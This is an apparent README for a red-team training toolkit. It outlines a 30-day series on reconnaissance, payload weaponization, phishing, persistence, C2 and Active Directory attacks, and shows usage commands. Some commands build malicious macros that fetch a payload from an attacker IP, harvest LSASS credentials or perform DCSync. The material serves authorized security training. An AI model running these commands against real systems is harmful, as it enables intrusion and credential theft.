# 30 Days of Red Team Toolkit

A comprehensive offensive security toolkit built progressively over 30 days, covering the complete attack lifecycle from reconnaissance to domain dominance.

## ⚠️ Legal Disclaimer

**IMPORTANT:** This toolkit is strictly for:
- Authorized penetration testing with written permission
- Educational purposes in controlled lab environments
- Improving defensive security posture

Unauthorized access to computer systems is illegal under laws including the Computer Fraud and Abuse Act (CFAA) in the United States and similar legislation worldwide. The authors assume no liability for misuse of these tools.

## 📖 Series Overview

### Week 1: Reconnaissance & Initial Access (Days 1-7)
- **Day 1:** [Understanding the Cyber Kill Chain](https://medium.com/30-days-of-red-team/30-days-of-red-team-day-1-understanding-the-kill-chain-your-roadmap-to-domain-admin-9e496bbf91dd)
- **Day 2:** [Advanced OSINT & External Reconnaissance](https://medium.com/30-days-of-red-team/30-days-of-red-team-day-2-advanced-osint-external-reconnaissance-finding-what-they-dont-f2de32dfc1b4)
- **Day 3:** [Weaponization & Payload Development](https://medium.com/30-days-of-red-team/30-days-of-red-team-day-3-weaponization-building-payloads-that-evade-detection-6268da00344e)
- **Day 4:** [Social Engineering & Delivery Mechanisms](https://medium.com/30-days-of-red-team/30-days-of-red-team-day-4-delivery-social-engineering-phishing-infrastructure-4d46f27cbd35)
- **Day 5:** [Initial Exploitation Techniques](https://medium.com/30-days-of-red-team/30-days-of-red-team-day-5-initial-exploitation-techniques-from-shell-to-system-access-fbb73d60dc27)
- **Day 6:** [Post-Exploitation & Situational Awareness](https://medium.com/30-days-of-red-team/30-days-of-red-team-day-6-post-exploitation-youre-in-now-what-254b09f2688e)
- **Day 7:** Week 1 Integration & Practice

### Week 2: Persistence & Command Control (Days 8-14)
- **Day 8:** Windows Persistence Mechanisms
- **Day 9:** Linux Persistence Techniques
- **Day 10:** Building Custom C2 Infrastructure
- **Day 11:** C2 Communication Channels
- **Day 12:** Data Exfiltration Methods
- **Day 13:** Operational Security & Anti-Forensics
- **Day 14:** Week 2 Integration & Practice

### Week 3: Lateral Movement & Privilege Escalation (Days 15-21)
- **Day 15:** Credential Harvesting (LSASS, SAM, Registry)
- **Day 16:** Windows Privilege Escalation
- **Day 17:** Linux Privilege Escalation
- **Day 18:** Lateral Movement Techniques (Pass-the-Hash, WMI, PSRemoting)
- **Day 19:** Pivoting & Network Tunneling
- **Day 20:** Exploiting Trust Relationships
- **Day 21:** Week 3 Integration & Practice

### Week 4: Active Directory & Domain Dominance (Days 22-28)
- **Day 22:** Active Directory Enumeration
- **Day 23:** Kerberoasting & AS-REP Roasting
- **Day 24:** Pass-the-Ticket & Overpass-the-Hash
- **Day 25:** Golden & Silver Tickets
- **Day 26:** DCSync & Domain Admin Compromise
- **Day 27:** Persistence at Domain Level
- **Day 28:** Week 4 Integration & Practice

### Week 5: Advanced Topics & Wrap-Up (Days 29-30)
- **Day 29:** Advanced Evasion & Detection Bypass
- **Day 30:** Series Wrap-Up & Building Your Career

## 🚀 Quick Start
```bash
# Clone the repository
git clone https://github.com/yourusername/30-days-red-team-toolkit.git
cd 30-days-red-team-toolkit

# Install dependencies
pip3 install -r requirements.txt

# Verify installation
python3 scripts/verify_setup.py

# Run Day 1 example
python3 01-reconnaissance/subdomain_enum.py example.com wordlists/subdomains.txt
```

## 📁 Repository Structure
```text
30-days-red-team-toolkit/
├── 01-reconnaissance/          # Days 1-2: OSINT and reconnaissance
│   ├── subdomain_enum.py
|   ├── web_checker.py
│   ├── google_dorker.py
│   ├── email_hunter.py
│   ├── tech_fingerprinter.py
│   ├── master_recon.py
│   └── wordlists/
│
├── 02-weaponization/          # Day 3: Payload generation
│   ├── payload_generator.py
│   ├── advanced_obfuscator.py
│   ├── shellcode_encoder.py
│   ├── macro_generator.py
│   └── payloads/
│
├── 03-delivery/               # Day 4: Social engineering
│   ├── phishing_framework.py
│   ├── email_templates/
│   └── landing_pages/
│
├── 04-exploitation/           # Day 5: Initial exploitation
│   ├── exploit_framework.py
│   └── exploits/
│
├── 05-persistence/            # Days 8-9: Maintaining access
│   ├── windows_persistence.py
│   ├── linux_persistence.py
│   └── mechanisms/
│
├── 06-command-control/        # Days 10-11: C2 infrastructure
│   ├── c2_server.py
│   ├── c2_client.py
│   └── servers/
│
├── 07-lateral-movement/       # Days 18-20: Moving through network
│   ├── credential_reuse.py
│   ├── pivot_framework.py
│   └── tools/
│
├── 08-privilege-escalation/   # Days 16-17: Gaining higher privileges
│   ├── windows_privesc.py
│   ├── linux_privesc.py
│   └── techniques/
│
├── 09-domain-dominance/       # Days 22-27: AD attacks
│   ├── kerberos_attacks.py
│   ├── bloodhound_automation.py
│   └── attacks/
│
├── 10-evasion/                # Day 29: Advanced evasion
│   ├── av_evasion.py
│   ├── edr_bypass.py
│   └── bypass/
│
├── templates/                 # Report and documentation templates
│   ├── recon_report.md
│   ├── engagement_notes.md
│   ├── findings_template.md
│   └── executive_summary.md
│
├── docs/                      # Daily documentation
│   ├── day01-kill-chain.md
│   ├── day02-reconnaissance.md
│   ├── day03-weaponization.md
│   └── [...]
│
├── scripts/                   # Utility scripts
│   ├── verify_setup.py
│   ├── lab_setup.sh
│   └── cleanup.py
│
└── configs/                   # Configuration files
    ├── targets.yaml
    └── settings.json
```


## 🛠️ Tool Categories

### Reconnaissance
- **Subdomain enumeration** - DNS-based discovery
- **Google dorking** - Automated OSINT via search engines
- **Email harvesting** - Target identification
- **Technology fingerprinting** - Stack identification
- **Certificate transparency** - SSL/TLS enumeration
- **Social media scraping** - LinkedIn, Twitter, GitHub

### Weaponization
- **Payload generators** - Multi-format shell creation
- **Obfuscators** - AV/EDR evasion
- **Encoders** - Shellcode manipulation
- **Macro builders** - Office document weaponization
- **HTA generators** - HTML application payloads
- **MSI builders** - Windows Installer packages

### Delivery
- **Phishing frameworks** - Email campaign management
- **Template generators** - Convincing pretexts
- **Landing pages** - Credential harvesting sites
- **File hosting** - Payload delivery infrastructure
- **Tracking** - Victim engagement monitoring

### Exploitation
- **Web exploitation** - SQLi, XSS, RCE
- **Service exploitation** - SMB, RDP, SSH
- **Application exploits** - Known CVE exploits
- **Custom exploit development** - Tailored attacks

### Persistence
- **Registry manipulation** - Windows persistence
- **Scheduled tasks** - Automated execution
- **Service creation** - Background processes
- **WMI events** - Event-driven persistence
- **Cron jobs** - Linux scheduling
- **SSH keys** - Authorized key injection

### Command & Control
- **HTTP/HTTPS C2** - Web-based communication
- **DNS C2** - DNS tunneling
- **Cloud C2** - Legitimate service abuse (Slack, Discord)
- **Custom protocols** - Encrypted channels

### Lateral Movement
- **Pass-the-Hash** - NTLM relay
- **Pass-the-Ticket** - Kerberos abuse
- **WMI** - Remote execution
- **PSRemoting** - PowerShell remoting
- **SSH tunneling** - Network pivoting
- **RDP hijacking** - Session theft

### Privilege Escalation
- **Kernel exploits** - OS-level escalation
- **Service misconfigurations** - Weak permissions
- **Token impersonation** - Privilege theft
- **Sudo abuse** - Linux escalation
- **DLL hijacking** - Library injection
- **Unquoted service paths** - Windows exploitation

### Domain Dominance
- **Kerberoasting** - Service account attacks
- **AS-REP Roasting** - Pre-auth disabled accounts
- **DCSync** - Domain controller replication
- **Golden tickets** - TGT forging
- **Silver tickets** - TGS forging
- **AdminSDHolder** - Permanent admin access

## 📖 Usage Examples

### Complete Reconnaissance
```bash
# Run full recon suite
python3 01-reconnaissance/master_recon.py target.com "Target Corporation"

# This will:
# - Enumerate subdomains
# - Run Google dorks
# - Harvest emails
# - Fingerprint technologies
# - Generate comprehensive report
```

### Generate Weaponized Payloads
```bash
# Create payload arsenal
python3 02-weaponization/payload_generator.py 10.10.14.5 4444

# Obfuscate for evasion
python3 02-weaponization/advanced_obfuscator.py payloads/shell.ps1

# Create malicious document
python3 02-weaponization/macro_generator.py --url http://10.10.14.5/payload.ps1
```

### Launch Phishing Campaign
```bash
# Set up phishing infrastructure (Day 4)
python3 03-delivery/phishing_framework.py --target targets.txt --template corporate

# Track engagement
python3 03-delivery/track_victims.py --campaign campaign_001
```

### Post-Exploitation
```bash
# Establish persistence (Day 8)
python3 05-persistence/windows_persistence.py --method registry --payload shell.exe

# Harvest credentials (Day 15)
python3 07-lateral-movement/credential_harvest.py --method lsass
```

### Active Directory Attack
```bash
# Enumerate AD (Day 22)
python3 09-domain-dominance/ad_enum.py --domain target.local

# Kerberoast (Day 23)
python3 09-domain-dominance/kerberos_attacks.py --attack kerberoast

# DCSync (Day 26)
python3 09-domain-dominance/dcsync.py --user Administrator
```

## 🧪 Lab Setup

### Recommended Lab Environment

**Attacking Machine:**
- Kali Linux or Parrot OS
- 4GB+ RAM
- 50GB+ storage

**Target Environment:**
- Windows 10/11 workstation
- Windows Server 2019/2022 (Domain Controller)
- Ubuntu/Debian Linux server
- Vulnerable web application (DVWA, WebGoat)

### Quick Lab Setup
```bash
# Run automated lab setup (requires VirtualBox/VMware)
bash scripts/lab_setup.sh

# Or use pre-built environments:
# - HackTheBox
# - TryHackMe
# - VulnHub
# - GOAD (Game of Active Directory)
```

## 🎓 Learning Path

### Beginner Path (No prior experience)
1. Start with Day 1 - understand the fundamentals
2. Complete Days 1-7 thoroughly before moving on
3. Set up a safe lab environment
4. Practice each technique multiple times
5. Take notes and document your learning

### Intermediate Path (Some security experience)
1. Review Days 1-3 quickly
2. Focus on Days 4-21 (delivery through lateral movement)
3. Build custom tools based on the examples
4. Participate in CTF challenges alongside the series
5. Contribute improvements to the toolkit

### Advanced Path (Experienced practitioners)
1. Use as reference material
2. Focus on Days 22-30 (AD attacks and evasion)
3. Adapt tools for specific environments
4. Integrate with existing offensive frameworks
5. Share knowledge and mentor others

## 🔒 Operational Security

When using this toolkit:

### DO:
- ✅ Get written authorization before testing
- ✅ Test in isolated lab environments
- ✅ Keep detailed logs of your activities
- ✅ Use VPNs and proxies appropriately
- ✅ Follow responsible disclosure for findings
- ✅ Respect scope limitations
- ✅ Protect client data and credentials

### DON'T:
- ❌ Test without explicit permission
- ❌ Use in production environments without authorization
- ❌ Share operational payloads publicly
- ❌ Assume "educational purposes" is legal defense
- ❌ Leave artifacts or backdoors after engagement
- ❌ Disclose vulnerabilities publicly without coordination
- ❌ Use tools maliciously

## 📚 Additional Resources

### Books
- "The Hacker Playbook 3" by Peter Kim
- "Red Team Field Manual" by Ben Clark
- "Operator Handbook" by Joshua Picolet
- "Active Directory Security" by Sean Metcalf

### Certifications
- OSCP (Offensive Security Certified Professional)
- CRTP (Certified Red Team Professional)
- CRTO (Certified Red Team Operator)
- PNPT (Practical Network Penetration Tester)

### Practice Platforms
- HackTheBox (htb.com)
- TryHackMe (tryhackme.com)
- PentesterLab (pentesterlab.com)
- VulnHub (vulnhub.com)

### Communities
- Reddit: r/netsec, r/AskNetsec
- Discord: Many infosec servers
- Twitter: #infosec, #redteam, #30DaysOfRedTeam

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/improvement`)
3. Make your changes
4. Test thoroughly
5. Submit a pull request

### Contribution Ideas
- Additional payload types
- New evasion techniques
- Tool improvements
- Documentation enhancements
- Bug fixes
- Lab automation scripts

## 🐛 Known Issues & Limitations
- Some tools require specific Python versions (3.8+)
- Windows-specific tools may not work on Linux/Mac
- Some techniques are detected by modern EDR (intentional for learning)
- API rate limiting may affect OSINT tools
- Payload effectiveness varies by target environment

## 📝 Changelog

### v1.0.0 (Days 1-3)
- Initial reconnaissance toolkit
- Payload generation framework
- Basic obfuscation and evasion

### Future Releases
- Days 4-30 tools and documentation
- Advanced evasion techniques
- Automated lab setup
- Integration with popular frameworks

## 📬 Contact & Support
- **Series Author:** Maxwell Cross
- **Blog:** [Maxwell Cross | Medium](https://medium.com/@maxwellcross)
- **Issues:** [GitHub Issues page](https://github.com/itsmaxwellcross/30-days-red-team-toolkit/issues)
- **Discussion:** #30DaysOfRedTeam

## ⚖️ License

MIT License - See LICENSE file for details.

**Educational Use:** This toolkit is designed for learning offensive security techniques in authorized environments.

**Ethical Use:** By using this toolkit, you agree to use it responsibly and legally.

## 🙏 Acknowledgments
- The offensive security community
- Open source tool developers
- Contributors and testers
- Everyone following #30DaysOfRedTeam

---

**Remember:** The difference between a red teamer and a criminal is authorization. Always get permission. Always act ethically. Always follow the law.

**Stay curious. Stay legal. Stay ethical.**

---
*Last updated: Oct 25th, 2025*
*Version: 1.0.0 (Days 1-3)*